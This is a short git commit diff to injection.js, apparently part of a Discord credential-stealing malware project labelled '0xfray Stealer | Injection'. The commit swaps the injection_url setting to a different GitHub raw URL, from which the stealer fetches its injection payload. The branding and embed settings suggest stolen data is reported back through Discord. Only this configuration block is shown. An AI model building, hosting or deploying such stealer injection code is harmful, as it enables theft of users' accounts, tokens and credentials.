17f26deb2bcd9844b45bd1f9326b9d03912d8bcb
QI8YOAIHGLJSHBOIQ <VapeDetectorADMIN@proton.me>
2025-02-03 09:02:38 +1100

    Update injection.js

--- injection.js
+++ injection.js
@@ -14,7 +14,7 @@ const config = {
   embed_name: '0xfray Stealer | Injection', 
   embed_icon: 'https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/wtfcstealerwtf/index/main/injection.js', 
+  injection_url: 'https://raw.githubusercontent.com/QI8YOAIHGLJSHBOIQ/-OSJG-OJBIWEHGP9/refs/heads/main/injection.js', 
   /**
    
    **/
